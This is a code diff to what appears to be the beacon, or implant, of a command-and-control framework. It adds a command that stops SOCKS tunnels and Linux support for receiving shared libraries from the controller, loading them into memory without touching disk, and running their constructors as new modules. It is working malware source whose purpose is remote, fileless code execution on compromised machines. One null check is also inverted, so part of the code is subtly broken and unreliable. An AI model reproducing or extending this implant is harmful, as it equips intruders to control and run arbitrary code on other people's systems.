@@ -8,6 +8,11 @@
 #include <sys/types.h>
 #include <pwd.h>
 #include <sys/utsname.h>
+#include <dlfcn.h>
+
+#include <MemoryModule.h>
+
+typedef ModuleCmd* (*constructProc)();
 
 #elif _WIN32
 
@@ -653,6 +658,11 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			}
 			SPDLOG_DEBUG("Socks5 stop Finished");
 		}
+		else if(c2Message.cmd() == "stopSocks")
+		{
+			for(int i=0; i<m_socksTunnelClient.size(); i++)
+				m_socksTunnelClient[i].reset(nullptr);
+		}
 
 		SPDLOG_DEBUG("Finishing");
 
@@ -667,6 +677,53 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	else if(instruction == LoadC2Module)
 	{
 #ifdef __linux__
+		const std::string inputfile = c2Message.inputfile();
+		const std::string buffer = c2Message.data();
+
+		SPDLOG_DEBUG("LoadC2Module inputfile {}, buffer {}", inputfile, buffer.size());
+
+		void* handle = NULL;
+		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
+		if (handle == NULL)
+		{
+
+			std::string msg = "Error MemoryLoadLibrary";
+			c2RetMessage.set_returnvalue(msg);
+			return false;
+		}
+
+		SPDLOG_DEBUG("MemoryLoadLibrary handle {}", handle);
+		
+		// TODO put functionName to libFunctionName.so -> FunctionNameConstructor
+		// inputfile....
+		std::string funcName = inputfile;
+		funcName = funcName.substr(3); 							// remove lib
+		funcName = funcName.substr(0, funcName.length() - 3);	// remove .so
+		funcName += "Constructor";
+
+		SPDLOG_DEBUG("MemoryLoadLibrary funcName {}", funcName);
+
+		constructProc construct;
+		construct = (constructProc)dlsym(handle, funcName.c_str());
+		if (!construct != NULL) 
+		{
+			std::string msg = "Error MemoryGetProcAddress";
+			c2RetMessage.set_returnvalue(msg);
+			return false;
+		}
+
+		SPDLOG_DEBUG("MemoryLoadLibrary construct success" );
+
+		ModuleCmd* moduleCmd = construct();
+
+		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
+		m_moduleCmd.push_back(std::move(moduleCmd_));
+
+		std::string msg = "Module loaded successfully:\n";
+		msg += inputfile;
+		// msg += m_moduleCmd.back()->getInfo();
+		c2RetMessage.set_returnvalue(msg);
+		
 #elif _WIN32
 
 		// TODO add a map of loaded modules, with inputfile/handled, to check of a module is already loaded and to be able to unload the handler
